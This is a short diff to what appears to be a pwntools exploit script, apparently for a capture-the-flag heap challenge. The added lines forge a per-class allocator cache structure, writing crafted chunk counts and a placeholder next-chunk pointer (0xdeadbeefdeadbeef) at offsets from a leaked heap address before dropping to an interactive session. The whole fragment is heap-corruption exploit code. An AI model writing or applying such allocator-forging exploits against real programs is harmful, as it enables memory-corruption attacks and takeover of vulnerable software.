@@ -104,6 +104,14 @@ print(f'perclass chunk: 0x{perclass_chunk:x}')
 
 # create perclass structure in the following perclass structure
 
+num_cached_chunks = 1
+max_cached_chunks = 2
+next_cached_chunk = 0xdeadbeefdeadbeef
+class_id_offset = 1
+
+write(io, perclass_chunk+((class_id_offset-1)*0x100)+0xe0, p32((max_cached_chunks<<16) + num_cached_chunks))
+write(io, perclass_chunk+((class_id_offset-1)*0x100)+0xf0, p64(next_cached_chunk))
+
 # =============================================================================
 
 io.interactive()
